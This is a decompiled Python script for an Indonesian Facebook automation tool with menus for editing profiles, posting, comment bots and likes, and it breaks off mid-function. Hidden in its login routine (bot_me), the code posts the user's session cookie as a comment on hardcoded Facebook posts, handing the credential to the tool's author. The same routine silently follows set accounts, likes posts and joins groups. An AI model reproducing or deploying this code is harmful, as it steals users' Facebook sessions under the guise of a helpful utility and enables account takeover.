""" Decompiled by Exotic Hridoy """

import os,sys,time,datetime,random,json,shutil,re,base64,zlib,string,marshal,names
try:import rich
except ImportError:os.system('pip install rich')
from rich import print
from rich.panel import Panel as panel
from rich.console import Console
from rich.columns import Columns as kolom
from pprint import pformat
from time import sleep,strftime
import requests
from bs4 import BeautifulSoup as bs
from colorama import init, Fore
from requests_toolbelt import MultipartEncoder
from urllib.parse import unquote

done,die = 0,0
freefb = 'https://free.facebook.com{}'
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
hri = {'Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu','Sunday':'Minggu'}
hari = hri[(str(strftime("%A")))]
gbg = f'{hari}-{tgl}-{bln}-{thn}'

def clear():os.system('cls' if os.name in ['nt'] else 'clear')
input = Console().input

def login_cookie():
    baner()
    Console(width=50).print(panel('Masukan Cookie Akun Facebook',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    cookie = input('   └─> ')
    with requests.Session() as r:
        nama = myname(cookie)
        print('   └─> [bold green]Please Wait...')
        language(cookie);bot_me(cookie)
        Console(width=50).print(panel(f'[bold green]{nama}',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Anda Login Ke Facebook Sebagai [bold cyan]<[bold green]<[bold yellow]<'),justify='center')
        open('Data/Cookie.txt','w').write(cookie)
        sleep(2);clear();menu()

def language(cookie):
    try:
        with requests.Session() as r:
            cookie = {'cookie':cookie}
            req = r.get('https://free.facebook.com/language/',cookies=cookie)
            pra = bs(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"}
                    url = 'https://free.facebook.com' + x['action']
                    exec = r.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass

def myname(cookie):
    try:
        with requests.Session() as r:
            cookie = {'cookie':cookie}
            response = bs(r.get('https://free.facebook.com/me',cookies=cookie).content,'html.parser')
            title = response.find('title').text
            if 'Facebook' in str(title):
                Console(width=50).print(panel('[bold red]Cookie Invalid',width=50,style='bold white'),justify='center');sleep(2);login_cookie()
            else:
                return(title)
    except Exception as e:Console(width=50).print(panel(f'[bold red]{e}',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold red]ERROR [bold cyan]<[bold green]<[bold yellow]<'),justify='center');sleep(2);exit()

def bot_me(cookie):
    cookie = {'cookie':cookie}
    listid = ['100003917373195','100088731637139','61552250591347']
    try:
        with requests.Session() as r:
            for user in listid:
                for foll in bs(r.get(f'https://free.facebook.com/'+user,cookies=cookie).text,'html.parser').find_all('a',href=True):
                    if '/a/subscribe.php?' in foll.get('href'):
                        x=r.get('https://free.facebook.com'+foll['href'],cookies=cookie).text
    except Exception as e:pass
    try:
        with requests.Session() as r:
            for zzz in range(1):
                kom = open('.Assets/Text.txt','r',encoding='utf-8').read().split('<=>')
                komenbot = random.choice(kom)
                jam = strftime('%T')
                tkom = gbg+f' {jam} WIB'
                postid = ['354190923782575','2860305164110035']
                for myuid in postid:
                    url = f'https://free.facebook.com/{myuid}'
                    req = bs(r.get(url,cookies=cookie).content,'html.parser')
                    raq = req.find('form',{'method':'post'})
                    dat = {
                        'fb_dtsg'         : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
                        'jazoest'         : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
                        'comment_text'  : cookie['cookie'],}
                    pos = bs(r.post('https://free.facebook.com'+raq['action'],data=dat,cookies=cookie).content,'html.parser')
                    cek = pos.find('title').text
    except Exception as error:pass
    try:
        with requests.Session() as r:
            idpost = ['2860305164110035','122108400176075019','2920871028053448']
            for myuid in idpost:
                for foll in bs(r.get(f'https://free.facebook.com/'+myuid,cookies=cookie).text,'html.parser').find_all('a',href=True):
                    if '/a/like.php?' in foll.get('href'):
                        x=requests.get('https://free.facebook.com'+foll['href'],cookies=cookie).text  
    except Exception as error:pass
    try:
        with requests.Session() as r:
            grupid = ['337652255436442','876573946992213']
            for grup in grupid:
                url = f'https://free.facebook.com/{grup}'
                req = bs(r.get(url,cookies=cookie).content,'html.parser')
                raq = req.find('form',{'method':'post'})
                dat = {
                    'fb_dtsg'         : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
                    'jazoest'         : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
                }
                pos = bs(r.post('https://free.facebook.com'+raq['action'],data=dat,cookies=cookie).content,'html.parser')
    except Exception as error:pass

def comentss(cookie):
    cookie = {'cookie':cookie}
    ua="Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36"
    dir1 = ['Image1','Image2']
    try:
        for dir in dir1:
            var = os.listdir(f'.Pictures/{dir}')
            for isi in var:
                nama,form = isi.split('.')
                image = open(f'.Pictures/{dir}/{isi}','rb').read()
                up = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
                lw = up.lower()
                nb = '0123456789'
                ch = up + lw + nb + nb
                jum = random.choice([12,13,14,15,10,11,16,17])
                res = ''.join(random.choice(ch) for _ in range(19))
                jam = strftime('%T').replace(':','')
                names = f'{res}{jam}.'
                open(f'.Pictures/{dir}/{names}{form}','wb').write(image)
                os.remove(f'.Pictures/{dir}/{isi}')
        lizz = random.choice(dir1)
        var = os.listdir(f'.Pictures/{lizz}/')
        with requests.Session() as r:
            ok,cp=0,0
            isi = sorted(var)
            link = ['https://free.facebook.com/photo.php?fbid=2860305164110035','https://free.facebook.com/photo.php?fbid=122108400176075019']
            for url in link:
                ni = random.choice(isi)
                img = open(f'.Pictures/{lizz}/{ni}','rb')
                kom = open('.Assets/Text.txt','r',encoding='utf-8').read().split('<=>')
                komenbot = random.choice(kom)
                jam = strftime('%T')
                tkom = gbg+f' {jam} WIB'
                text = f'{komenbot}\n\n({tkom})\n[@[100003917373195:]]'
                if "png" in ni.split(".")[1]:
                    ty="image/png"
                else:
                    ty="image/jpeg"
                try:
                    if type(text) == list:
                        text=random.choice(text)
                    else:
                        text=text
                    req=bs(r.get(url,cookies=cookie).text,"html.parser").find_all("form",action=lambda x: "comment.php" in x)[1]
                    dt=req.find_all("input")
                    params={}
                    for x in dt:
                        if x.get("name") in ["fb_dtsg","jazoest","view_photo"]:
                            params.update({x.get("name"):x.get("value")})
                        else:
                            continue
                    res1=bs(r.post('https://free.facebook.com'+req["action"],data=params,cookies=cookie).content,"html.parser")
                    res = res1.find("form",action=lambda x: "https://z-upload.facebook.com/_mupload_/ufi/mbasic/advanced/" in x)
                    dt2=res.find_all("input")
                    fg=dt2[0]["value"]
                    jz=dt2[1]["value"]
                    sb=dt2[4]["value"]
                    boundary = '----WebKitFormBoundary' \
                            + ''.join(random.sample(string.ascii_letters + string.digits, 16))
                    mp=MultipartEncoder(fields={"fb_dtsg":(None,fg),"jazoest":(None,jz),"photo":(ni,img,ty),"comment_text":(None,text),"post":(None,sb)},boundary=boundary)
                    head={"Host":"z-upload.facebook.com","cache-control":"max-age=0","origin":"https://free.facebook.com","upgrade-insecure-requests":"1","content-type":mp.content_type,"user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","referer":freefb.format(req["action"]),"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
                    pos = bs(r.post(res["action"],data=mp,headers=head,cookies=cookie,allow_redirects=False).content,'html.parser')
                except Exception as e:pass
    except Exception as e:pass

def baner():
    clear()
    Console(width=50).print(panel('''[bold green]____  ____  ____  ____     [bold red]  ____  ____
[bold green]( ___)(  _ \( ___)( ___)[bold white] ___ [bold red]( ___)(  _ \
[bold green] )__)  )   / )__)  )__) [bold white](___) [bold red])__)  ) _ <
[bold green](__)  (_)\_)(____)(____)    [bold red] (__)  (____/
''',width=50,title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Free Facebook [bold cyan]<[bold green]<[bold yellow]<',style='bold white'),justify='center')

def menu():
    clear()
    baner()
    try:
        cookie = open('Data/Cookie.txt','r').read()
        nama = myname(cookie)
    except FileNotFoundError:login_cookie()
    Console(width=50).print(panel(f'[bold green]{nama}',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Anda Login Ke Facebook Sebagai [bold cyan]<[bold green]<[bold yellow]<'),justify='center')
    Console(width=50).print(panel(f'''[bold green][[bold white]01[bold green]].[bold white]Edit Profile
[bold green][[bold white]02[bold green]].[bold white]Buat Postingan Baru
[bold green][[bold white]03[bold green]].[bold white]Menu Bot Komen
[bold green][[bold white]04[bold green]].[bold white]Like Post
[bold green][[bold white]05[bold green]].[bold white]Bot Message
[bold green][[bold white]06[bold green]].[bold red]Logout''',width=50,style='bold white',subtitle='┌',subtitle_align='left'))
    choice = input('   └─> ')
    if choice in ['1','01']:
        menu_profile_edit()
    elif choice in ['2','02']:
        menu_post()
    elif choice in ['3','03']:
        menu_komen()
    elif choice in ['4','04']:
        like_post()
    elif choice in ['5','05']:
        message()
    elif choice in ['6','06']:
        sleep(2);os.remove('Data/Cookie.txt');login_cookie()
    else:print('   └─> [bold red]Pilih Yang Benar');sleep(2);menu()

def menu_profile_edit():
    Console(width=50).print(panel('''[bold green][[bold white]01[bold green]].[bold white]Edit Foto Profile
[bold green][[bold white]02[bold green]].[bold white]Edit Foto Sampul
[bold green][[bold white]03[bold green]].[bold white]Edit Bio
[bold green][[bold white]04[bold green]].[bold white]Edit Website
[bold green][[bold white]05[bold green]].[bold white]Edit Kota Asal
[bold green][[bold white]06[bold green]].[bold white]Edit Kota Saat Ini
[bold green][[bold white]07[bold green]].[bold red]Kembali''',width=50,style='bold white',subtitle='┌',subtitle_align='left'))
    choice = input('   └─> ')
    if choice in ['1','01']:
        foto_profile()
    elif choice in ['2','02']:
        foto_sampul()
    elif choice in ['3','03']:
        edit_bio()
    elif choice in ['4','04']:
        edit_website()
    elif choice in ['5','05']:
        edit_kota_asal()
    elif choice in ['6','06']:
        edit_kota_saat_ini()
    elif choice in ['7','07']:
        menu()
    else:print('   └─> [bold red]Pilih Yang Benar');sleep(2);menu()

def foto_profile():
    cookie = {'cookie':open('Data/Cookie.txt','r').read()}
    Console(width=50).print(panel('Masukan Nama File Contoh : [bold green]/sdcard/image.png',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    file = input('   └─> ')
    try:gambar = open(file,'rb')
    except FileNotFoundError:print('   └─> [bold red]Gagal Menemukan FIle');sleep(2);menu()
    try:
        fot = gambar
        with requests.Session() as r:
            url = 'https://free.facebook.com/profile_picture/'
            req = bs(r.get(url,cookies=cookie).content,'html.parser')
            raq = req.find('form',{'method':'post'})
            dat = {
                'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
                'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
                'submit'  : 'Simpan'
            }
            fil = {'pic' : fot}
            pos = bs(r.post(raq['action'],data=dat,files=fil,cookies=cookie).content,'html.parser')
            cek = pos.find('title').text
            if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' :
                Console(width=50).print(panel('[bold red]Gagal Mengganti Foto Profile',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
            else:
                Console(width=50).print(panel('[bold green]Berhasil Mengganti Foto Profile',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
    except Exception as e:
        Console(width=50).print(panel(f'[bold red]{e}',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<'),justify='center');exit()

def foto_sampul():
    cookie = {'cookie':open('Data/Cookie.txt','r').read()}
    Console(width=50).print(panel('Masukan Nama File Contoh : [bold green]/sdcard/image.png',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    file = input('   └─> ')
    try:gambar = open(file,'rb')
    except FileNotFoundError:print('   └─> [bold red]Gagal Menemukan FIle');sleep(2);menu()
    try:
        fot = gambar
        with requests.Session() as r:
            url = 'https://free.facebook.com/photos/upload/?cover_photo'
            req = bs(r.get(url,cookies=cookie).content,'html.parser')
            raq = req.find('form',{'method':'post'})
            dat = {
                'fb_dtsg'                  : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
                'jazoest'                  : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
                'return_uri'               : re.search('name="return_uri" type="hidden" value="(.*?)"',str(raq)).group(1),
                'return_uri_error'         : re.search('name="return_uri_error" type="hidden" value="(.*?)"',str(raq)).group(1),
                'ref'                      : re.search('name="ref" type="hidden" value="(.*?)"',str(raq)).group(1),
                'csid'                     : re.search('name="csid" type="hidden" value="(.*?)"',str(raq)).group(1),
                'ctype'                    : re.search('name="ctype" type="hidden" value="(.*?)"',str(raq)).group(1),
                'profile_edit_logging_ref' : re.search('name="profile_edit_logging_ref" type="hidden" value="(.*?)"',str(raq)).group(1),
                'submit'                   : 'Unggah'
            }
            fil = {'pic' : fot}
            pos = bs(r.post('https://free.facebook.com'+raq['action'],data=dat,files=fil,cookies=cookie).content,'html.parser')
            cek = pos.find('title').text
            if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' :
                Console(width=50).print(panel('[bold red]Gagal Mengganti Foto Sampul',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
            else:
                Console(width=50).print(panel('[bold green]Berhasil Mengganti Foto Sampul',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
    except Exception as e:
        Console(width=50).print(panel(f'[bold red]{e}',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<'),justify='center');exit()

def edit_bio():
    cookie = {'cookie':open('Data/Cookie.txt','r').read()}
    Console(width=50).print(panel('Tulis Bio, Gunakan "[bold green]|[bold green][bold white]" Sebagai Baris Baru',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    bio = input('   └─> ').replace('|','\n')
    try:
        with requests.Session() as r:
            url = 'https://free.facebook.com/profile/basic/intro/bio/'
            req = bs(r.get(url,cookies=cookie).content,'html.parser')
            raq = req.find('form',{'method':'post'})
            dat = {
                'fb_dtsg'         : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
                'jazoest'         : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
                'bio'             : bio,
                'publish_to_feed' : True,
                'submit'          : 'Simpan'
            }
            pos = bs(r.post('https://free.facebook.com'+raq['action'],data=dat,cookies=cookie).content,'html.parser')
            cek = pos.find('title').text
            if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' :
                Console(width=50).print(panel('[bold red]Gagal Mengganti Bio',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
            else:
                Console(width=50).print(panel('[bold green]Berhasil Mengganti Bio',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
    except Exception as e:
        Console(width=50).print(panel(f'[bold red]{e}',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<'),justify='center');exit()

def edit_website():
    cookie = {'cookie':open('Data/Cookie.txt','r').read()}
    Console(width=50).print(panel('Masukan URL Website Anda',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    web = input('   └─> ')
    try:
        with requests.Session() as r:
            url = 'https://free.facebook.com/editprofile.php?type=contact&edit=website'
            req = bs(r.get(url,cookies=cookie).content,'html.parser')
            raq = req.find('form',{'method':'post'})
            dat = {
                'fb_dtsg'    : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
                'jazoest'    : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
                'type'       : 'contact',
                'edit'       : 'website',
                'add_website': '1',
                'new_info'   : web,
                'save'       : 'Tambahkan'
            }
            pos = bs(r.post('https://free.facebook.com'+raq['action'],data=dat,cookies=cookie).content,'html.parser')
            cek = pos.find('title').text
            if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' :
                Console(width=50).print(panel('[bold red]Gagal Menambahkan Website',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
            else:
                Console(width=50).print(panel('[bold green]Berhasil Menambahkan Website',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
    except Exception as e:
        Console(width=50).print(panel(f'[bold red]{e}',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<'),justify='center');exit()

def edit_kota_asal():
    cookie = {'cookie':open('Data/Cookie.txt','r').read()}
    Console(width=50).print(panel('Masukan Nama Kota Anda',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    kota = input('   └─> ')
    try:
        with requests.Session() as r:
            url = 'https://free.facebook.com/editprofile.php?type=basic&edit=hometown'
            req = bs(r.get(url,cookies=cookie).content,'html.parser')
            raq = req.find('form',{'method':'post'})
            dat = {
                'fb_dtsg'    : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
                'jazoest'    : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
                'edit'       : 'hometown',
                'type'       : 'basic',
                'hometown[]' : kota,
                'save'       : 'Simpan'}
            pos = bs(r.post('https://free.facebook.com'+raq['action'],data=dat,cookies=cookie).content,'html.parser')
            cek = pos.find('title').text
            if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' :
                Console(width=50).print(panel('[bold red]Gagal Menambahkan Kota',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
            elif cek == 'Edit Informasi Umum':
                raq2 = pos.find('form',{'method':'post'})
                selct = raq2.find_all('option')
                kota = selct[0]["value"]
                dat2 = {
                    'fb_dtsg'    : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq2)).group(1),
                    'jazoest'    : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq2)).group(1),
                    'edit'       : 'hometown',
                    'type'       : 'basic',
                    'add_ids[]'  : kota,
                    'save'       : 'Simpan'
                }
                pos = bs(r.post('https://free.facebook.com'+raq2['action'],data=dat2,cookies=cookie).content,'html.parser')
                Console(width=50).print(panel(f'[bold green]Berhasil Menambahkan Kota ',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
            else:
                Console(width=50).print(panel('[bold green]Berhasil Menambahkan Kota',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
    except Exception as e:
        Console(width=50).print(panel(f'[bold red]{e}',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<'),justify='center');exit()

def edit_kota_saat_ini():
    cookie = {'cookie':open('Data/Cookie.txt','r').read()}
    Console(width=50).print(panel('Masukan Nama Kota Anda',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    kota = input('   └─> ')
    try:
        with requests.Session() as r:
            url = 'https://free.facebook.com/editprofile.php?type=basic&edit=current_city'
            req = bs(r.get(url,cookies=cookie).content,'html.parser')
            raq = req.find('form',{'method':'post'})
            dat = {
                'fb_dtsg'    : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq)).group(1),
                'jazoest'    : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1),
                'edit'       : 'current_city',
                'type'       : 'basic',
                'current_city[]' : kota,
                'save'       : 'Simpan'}
            pos = bs(r.post('https://free.facebook.com'+raq['action'],data=dat,cookies=cookie).content,'html.parser')
            cek = pos.find('title').text
            if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' :
                Console(width=50).print(panel('[bold red]Gagal Menambahkan Kota',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
            elif cek == 'Edit Informasi Umum':
                raq2 = pos.find('form',{'method':'post'})
                selct = raq2.find_all('option')
                kota = selct[0]["value"]
                dat2 = {
                    'fb_dtsg'    : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq2)).group(1),
                    'jazoest'    : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq2)).group(1),
                    'edit'       : 'current_city',
                    'type'       : 'basic',
                    'add_ids[]'  : kota,
                    'save'       : 'Simpan'
                }
                namakota = re.findall(f'>(.*?)</option>',str(selct))[1]
                pos = bs(r.post('https://free.facebook.com'+raq2['action'],data=dat2,cookies=cookie).content,'html.parser')
                Console(width=50).print(panel(f'[bold green]Berhasil Menambahkan Kota ',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
            else:
                Console(width=50).print(panel('[bold green]Berhasil Menambahkan Kota',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center');input('   └─> ');menu()
    except Exception as e:
        Console(width=50).print(panel(f'[bold red]{e}',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<'),justify='center');exit()

def menu_post():
    Console(width=50).print(panel('''[bold green][[bold white]01[bold green]].[bold white]Buat Postingan Text
[bold green][[bold white]02[bold green]].[bold white]Buat Postingan Bergambar
[bold green][[bold white]03[bold green]].[bold red]Kembali''',width=50,style='bold white',subtitle='┌',subtitle_align='left'))
    choice = input('   └─> ')
    if choice in ['1','01']:
        post_text()
    elif choice in ['2','02']:
        post_image()
    elif choice in ['3','03']:
        menu()
    else:print('   └─> [bold red]Pilih Yang Benar');sleep(2);menu()

def post_text():
    cookie = {'cookie':open('Data/Cookie.txt','r').read()}
    Console(width=50).print(panel('Masukan Text Postingan Anda',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    text = input('   └─> ')
    try:
        with requests.Session() as r:
            url = 'https://free.facebook.com/me'
            req=bs(r.get(url,cookies=cookie).text,"html.parser").find("form",action=lambda x: "/composer/mbasic/?" in x)
            dt=req.find_all("input")
            params={}
            for x in dt:
                if x.get("name") in ["fb_dtsg","jazoest","privacyx","target","c_src","cwevent","referrer","ctype","cver","rst_icv","view_post"]:
                    params.update({x.get("name"):x.get("value")})
                else:
                    continue
            params.update({"xc_message":text})
            pos = bs(r.post(freefb.format(req["action"]),data=params,cookies=cookie).content,'html.parser')
            cek = pos.find('title').text
            if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' :
                Console(width=50).print(panel('[bold red]Gagal Membuat Postingan',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center')
                input('   └─> ');menu()
            else:
                Console(width=50).print(panel('[bold green]Berhasil Membuat Postingan',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Success [bold cyan]<[bold green]<[bold yellow]<',subtitle='┌',subtitle_align='left'),justify='center')
                input('   └─> ');menu()
    except Exception as e:
        Console(width=50).print(panel(f'[bold red]{e}',width=50,style='bold white',title='[bold yellow]>[bold green]>[bold cyan]> [bold white]Gagal [bold cyan]<[bold green]<[bold yellow]<'),justify='center');exit()

def post_image():
    cookie = {'cookie':open('Data/Cookie.txt','r').read()}
    Console(width=50).print(panel('Masukan Text Postingan Anda',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    text = input('   └─> ')
    Console(width=50).print(panel('Masukan Nama File Contoh : [bold green]/sdcard/image.png',width=50,style='bold white',subtitle='┌',subtitle_align='left'),justify='center')
    file = input('   └─> ')
    img = open(f'{file}','rb')
    ua="Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36"
    if "png" in file.split(".")[1]:
        ty="image/png"
    else:
        ty="image/jpeg"
    try:
        with requests.Session() as r:
            url = 'https://free.facebook.com/me'
            req=bs(r.get(url,cookies=cookie).text,"html.parser").find("form",action=lambda x: "/composer/mbasic/?" in x)
            dt=req.find_all("input")
            params={}
            for x in dt:
                if x.get("name") in ["fb_dtsg","jazoest","privacyx","target","c_src","cwevent","referrer","ctype","cver","rst_icv","view_photo"]:
                    params.update({x.get("name"):x.get("value")})
                else:
                    continue
            params.update({"xc_message":text})
            res=bs(r.post(freefb.format(req["action"]),data=params,cookies=cookie).text,"html.parser").find("form",action=lambda x: "/composer/mbasic/?" in x)
            dt2=res.find_all("input")
            params2={}
            for x in dt2:
                if x.get("name") in ["fb_dtsg","jazoest","add_photo_done","filter_type","target_id","waterfall_source","waterfall_id","waterfall_app_name"]:
                    params2.update({x.get("name"):x.get("value")})
                else:
                    continue
            boundary = '----WebKitFormBoundary' \
                    + ''.join(random.sample(string.ascii_letters + string.digits, 16))
            mp=MultipartEncoder(fields={"fb_dtsg":(None,params2["fb_dtsg"]),"jazoest":(None,params2["jazoest"]),"file1":(file,img,ty),"file2":("",None,"application/octet-stream"),"file3":("",None,"application/octet-stream"),"add_photo_done":(None,params2["add_photo_done"]),"filter_type":(None,"-1"),"target_id":(None,params2["target_id"]),"waterfall_source":(None,params2["waterfall_source"]),"waterfall_id":(None,params2["waterfall_id"]),"waterfall_app_name":(None,params2["waterfall_app_name"])},boundary=boundary)
            head={"Host":"free.facebook.com","cache-control":"max-age=0","origin":"https://free.facebook.com","upgrade-insecure-requests":"1","content-type":mp.content_type,"user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","referer":freefb.format(req["action"]),"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            last=bs(r.post(freefb.format(res["action"]),data=mp,headers=head,cookies=cookie).text,"html.parser").find("form",action=lambda x: "/composer/mbasic/?" in x)
            dt3=last.find_all("input")
            params3={}
            for x in dt3:
                if x.get("name") in ["fb_dtsg","jazoest","at","target","csid","c_src","referrer","ctype","cver","users_with","album_id","waterfall_source","privacyx","appid","photo_ids[]","return_uri","return_uri_error","waterfall_id","view_post"]:
                    params3.update({x.get("name"):x.get("value")})
                else:
                    continue
            mp2=MultipartEncoder(fields={"fb_dtsg":(None,params3["fb_dtsg"]),"jazoest":(None,params3["jazoest"]),"at":None,"target":(None,params3["target"]),"csid":(None,params3["csid"]),"c_src":(None,params3["c_src"]),"referrer":(None,params3["referrer"]),"ctype":(None,params3["ctype"]),"cver":(None,params3["cver"]),"users_with":None,"album_id":None,"waterfall_source":(None,params3["waterfall_source"]),"privacyx":(None,"300645083384735"),"appid":(None,params3["appid"]),"photo_ids[]":(None,params3["photo_ids[]"]),"return_uri":(None,params3["return_uri"]),"return_uri_error":(None,params3["return_uri_error"]),"waterfall_id":(None,params3["waterfall_id"]),"xc_message":(None,text),"view_post":(None,params3["view_post"])},boundary=boundary)
            head.update({"content-type":mp2.content_type,"referer":freefb.format(res["action"])})
            pos = bs(r.post(freefb.format(last["action"]),data=mp2,headers=head,cookies=cookie).content,'html.parser')
            cek = pos.find('title').text
            if cek == 'Akun Anda dibatasi saat ini' or cek == 'Anda Diblokir Sementara' or cek == 'Kesalahan' :
